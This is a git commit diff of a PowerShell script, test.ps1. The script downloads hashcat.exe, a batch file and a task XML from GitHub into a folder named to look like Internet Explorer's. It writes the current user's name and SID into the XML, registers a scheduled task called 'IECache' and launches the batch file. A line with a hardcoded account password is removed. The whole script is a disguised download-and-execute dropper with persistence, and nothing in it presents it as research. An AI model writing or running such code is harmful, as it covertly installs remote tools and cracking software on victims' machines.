7aa185f1d1bb00d974109142eef125c98325e7ae
mysec000 <104643039+mysec000@users.noreply.github.com>
2022-05-09 20:16:42 +0530

    2

--- test.ps1
+++ test.ps1
@@ -1,11 +1,27 @@
+New-Item -ItemType Directory -Force -Path C:\Users\Admin\.IExplorer
+
 $source = 'https://github.com/mysec000/hashcat/blob/main/hashcat.exe?raw=true'
 $destination = 'C:\Users\Admin\.IExplorer\hashcat.exe'
 Invoke-WebRequest -Uri $source -OutFile $destination
 $source = 'https://raw.githubusercontent.com/mysec000/hashcat/main/Readme.bat?raw=true'
 $destination = 'C:\Users\Admin\.IExplorer\Readme.bat'
 Invoke-WebRequest -Uri $source -OutFile $destination
+$source = 'https://raw.githubusercontent.com/mysec000/tools/main/IECache.xml?raw=true'
+$destination = 'C:\Users\Admin\.IExplorer\IECache.xml'
+Invoke-WebRequest -Uri $source -OutFile $destination
+
+
+(Get-Content C:\Users\Admin\.IExplorer\IECache.xml -Raw) -Replace 'uname', ([System.Security.Principal.WindowsIdentity]::GetCurrent()).Name  | Set-Content C:\Users\Admin\.IExplorer\IECache.xml
+(Get-Content C:\Users\Admin\.IExplorer\IECache.xml -Raw) -Replace 'sid', ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value  | Set-Content C:\Users\Admin\.IExplorer\IECache.xml
+
+
+
 if ($(Get-ScheduledTask -TaskName "IECache" -ErrorAction SilentlyContinue).TaskName -eq "IECache") {
     Unregister-ScheduledTask -TaskName "IECache" -Confirm:$False
 }
-schtasks /Create /TN "IECache" /XML "C:\Users\Admin\.IExplorer\IECache.xml" /RU Admin /RP qwer@4321
+schtasks /Create /TN "IECache" /XML "C:\Users\Admin\.IExplorer\IECache.xml" 
+
+
+
+
 Start-Process "C:\Users\Admin\.IExplorer\Readme.bat"
